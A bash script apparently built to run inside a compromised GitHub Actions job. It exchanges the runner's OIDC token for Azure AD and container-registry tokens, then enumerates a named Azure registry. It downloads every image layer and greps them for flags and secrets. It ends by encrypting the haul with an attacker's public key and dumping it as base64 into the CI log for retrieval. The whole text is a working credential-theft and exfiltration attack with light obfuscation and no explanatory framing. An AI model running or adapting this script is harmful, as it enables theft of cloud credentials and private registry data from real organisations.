#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; AAD="${SC}login.microsoftonline.com"; ACRH="crtblplatprodx3euoz.azurecr.io"
echo "=== RUNNER ==="; id; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO OIDC"; exit 0; fi
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
aad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1"; }
AAT=$(aad "${SC}containerregistry.azure.net/.default" | jq -r '.access_token // empty'); say "AATLEN=${#AAT}"
TOK=""; 
rf=$(curl -sS "https://$ACRH/oauth2/exchange" -d grant_type=access_token -d service="$ACRH" -d tenant="$AZURE_TENANT_ID" --data-urlencode access_token="$AAT" | jq -r '.refresh_token // empty'); say "REFRESH=${#rf}"
if [ -n "$rf" ]; then TOK=$(curl -sS "https://$ACRH/oauth2/token?service=$ACRH&scope=registry:catalog:*" -H "Authorization: Bearer $rf" | jq -r '.access_token // empty'); fi
[ -z "$TOK" ] && TOK=$(curl -sS "https://$ACRH/oauth2/token?service=$ACRH&scope=registry:catalog:*" | jq -r '.access_token // empty')
say "BEARER=${#TOK}"
CAT=$(curl -sS -H "Authorization: Bearer $TOK" "https://$ACRH/v2/_catalog"); say "CATALOG=$CAT"
for R in $(printf '%s' "$CAT" | jq -r '.repositories[]? // empty'); do
  say "REPO $R tags=$(curl -sS -H "Authorization: Bearer $TOK" "https://$ACRH/v2/$R/tags/list")"
  ACC='application/vnd.oci.image.index.v1+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json, application/vnd.docker.distribution.manifest.list.v2+json'
  M=$(curl -sS -H "Authorization: Bearer $TOK" -H "Accept: $ACC" "https://$ACRH/v2/$R/manifests/latest"); say "MANIFEST $R: $(printf '%s' "$M" | head -c 600)"
  for dg in $(printf '%s' "$M" | jq -r '.manifests[]?.digest // empty'); do
    M2=$(curl -sS -H "Authorization: Bearer $TOK" -H "Accept: $ACC" "https://$ACRH/v2/$R/manifests/$dg")
    for l in $(printf '%s' "$M2" | jq -r '.layers[]?.digest // empty'); do
      say "LAYER $R $l $(curl -sS -L -H "Authorization: Bearer $TOK" "https://$ACRH/v2/$R/blobs/$l" -o /tmp/l.tgz -w 'http=%{http_code} sz=%{size_download}')"
      say "  HITS: $(tar -xzf /tmp/l.tgz -O 2>/dev/null | grep -aoiE '.{0,25}(flag\{|reach\{|TBL\{|CTF\{|flag=|FLAG_|the flag|secret=.{0,30}).{0,60}' | head -8 | tr '\n' '|')"
    done
  done
  for l in $(printf '%s' "$M" | jq -r '.layers[]?.digest // empty'); do
    say "LAYER $R $l $(curl -sS -L -H "Authorization: Bearer $TOK" "https://$ACRH/v2/$R/blobs/$l" -o /tmp/l.tgz -w 'http=%{http_code} sz=%{size_download}')"
    say "  HITS: $(tar -xzf /tmp/l.tgz -O 2>/dev/null | grep -aoiE '.{0,25}(flag\{|reach\{|TBL\{|CTF\{|flag=|FLAG_|the flag|secret=.{0,30}).{0,60}' | head -8 | tr '\n' '|')"
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
